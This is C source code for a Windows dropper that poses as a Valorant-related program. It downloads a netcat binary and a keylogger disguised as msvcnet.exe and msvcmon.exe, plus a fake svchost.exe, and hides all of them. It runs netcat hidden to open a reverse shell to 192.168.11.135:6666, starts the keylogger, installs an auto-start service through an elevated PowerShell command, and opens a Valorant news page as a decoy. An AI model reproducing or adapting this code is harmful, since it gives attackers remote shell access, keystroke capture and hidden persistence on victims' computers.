#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Shlobj.h>
#include <windows.h>
#include <wininet.h>
#include <stdbool.h>

#include "src/base64.h"



void DownloadFile(const char *url, const char *filePath)
{
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile)
    {
        FILE* file = fopen(filePath, "wb");
        if (file)
        {
            char buffer[2048];
            DWORD bytesRead; 

            do {
                InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead);
                fwrite(buffer, 1, bytesRead, file);
            } while (bytesRead > 0);

            fclose(file);
        }

        InternetCloseHandle(hFile);
    }

    InternetCloseHandle(hInternet);
}


int main(int argc, char* argv[]) 
{
    DWORD str_len;

    char desktop_path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop_path);

    char current_path[MAX_PATH];
    GetModuleFileName(NULL, current_path, MAX_PATH);

    // nc as msvcnet.exe
    char nc_path[MAX_PATH];
    snprintf(nc_path, MAX_PATH, "%s\\msvcnet.exe", desktop_path);

    // kylg as msvcmon.exe
    char kylg_path[MAX_PATH];
    snprintf(kylg_path, MAX_PATH, "%s\\msvcmon.exe", desktop_path);

    // this as svchost.exe
    char ps_params[256];
    char svchost_path[MAX_PATH];
    snprintf(svchost_path, MAX_PATH, "%s\\svchost.exe", desktop_path);
    sprintf(ps_params, 
        "-Command \"Start-Process cmd.exe -ArgumentList '/c sc create svchost binPath=\"%s\" start=auto && sc start svchost' -Verb RunAs\"",
        svchost_path);

    SetFileAttributes(svchost_path, FILE_ATTRIBUTE_HIDDEN);

    const char *nc_url = "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/msvcnet.exe";
    DownloadFile((const char *)nc_url, nc_path);
    SetFileAttributes(nc_path, FILE_ATTRIBUTE_HIDDEN);

    const char *kylg_url = "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/msvcmon.exe";
    DownloadFile((const char *)kylg_url, kylg_path);
    SetFileAttributes(kylg_path, FILE_ATTRIBUTE_HIDDEN);

    const char *svchost_url = "https://raw.githubusercontent.com/belajarqywok/wintrapd/main/build/svchost.exe";
    DownloadFile((const char *)svchost_url, svchost_path);
    SetFileAttributes(svchost_path, FILE_ATTRIBUTE_HIDDEN);

    const char *nc_params = "-d 192.168.11.135 6666 -e C:\\Windows\\System32\\cmd.exe";
    ShellExecute(NULL, "open", nc_path, nc_params, NULL, SW_HIDE);

    const char *kylg_params = "--out-log msvclog";
    ShellExecute(NULL, "open", kylg_path, kylg_params, NULL, SW_HIDE);

    const char *pshell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    ShellExecute(NULL, "open", pshell_path, ps_params, NULL, SW_HIDE);

    SetFileAttributes(current_path, FILE_ATTRIBUTE_HIDDEN);

    const char *valorant_url = "https://playvalorant.com/en-us/news/game-updates/";
    const char *chrome_path  = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    ShellExecuteA(NULL, "open", (const char *)chrome_path,
        (const char *)valorant_url, NULL, SW_SHOWNORMAL);

    return 0;
}
